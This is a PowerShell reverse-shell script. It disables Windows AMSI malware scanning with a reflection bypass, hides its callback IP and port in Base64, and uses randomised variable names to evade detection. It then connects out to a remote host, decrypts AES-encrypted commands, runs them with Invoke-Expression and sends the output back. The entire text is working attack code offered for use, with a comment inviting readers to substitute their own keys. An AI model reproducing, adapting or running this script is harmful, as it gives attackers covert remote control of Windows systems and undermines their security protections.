# Randomized polymorphic vars
$vx=("v"+[guid]::NewGuid().ToString("N").Substring(0,6))
$vy=("x"+[guid]::NewGuid().ToString("N").Substring(0,6))

# Config hidden in Base64
$cfg="MTkyLjE2OC4xLjEyMQ==" # "192.168.1.121"
$pp="ODA5MA=="              # "8090"

# Kill AMSI
$ams=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$fld=$ams.GetField('amsiInitFailed','NonPublic,Static')
$fld.SetValue($null,$true)

# AES decryptor
function $vx([Byte[]]$c,[Byte[]]$k,[Byte[]]$iv){
    $aes=[System.Security.Cryptography.Aes]::Create()
    $aes.Mode="CBC";$aes.Padding="PKCS7"
    $aes.Key=$k;$aes.IV=$iv
    $dec=$aes.CreateDecryptor()
    $ms=New-Object IO.MemoryStream(,$c)
    $cs=New-Object Security.Cryptography.CryptoStream($ms,$dec,'Read')
    $sr=New-Object IO.StreamReader($cs)
    $sr.ReadToEnd()
}

# Decode IP/Port
$ip=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cfg))
$pr=[int][Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($pp))

# AES keys (replace with yours for unique sessions)
$k=[Convert]::FromBase64String("Lk3PbO8Z5nBlzYvQ4U0wGg==")
$iv=(1..16)|%{0}

# Connect back
$cl=New-Object Net.Sockets.TcpClient($ip,$pr)
$st=$cl.GetStream()
$bf=New-Object Byte[] 4096

while(($i=$st.Read($bf,0,$bf.Length))-ne 0){
    try {
        $cmd=& $vx $bf[0..($i-1)] $k $iv
        $res=Invoke-Expression $cmd | Out-String
    } catch {
        $res="Error: $($_.Exception.Message)`n"
    }
    $res+="PS "+(Get-Location).Path+"> "
    $out=[Text.Encoding]::UTF8.GetBytes($res)
    $st.Write($out,0,$out.Length)
    $st.Flush()
}

$cl.Close()
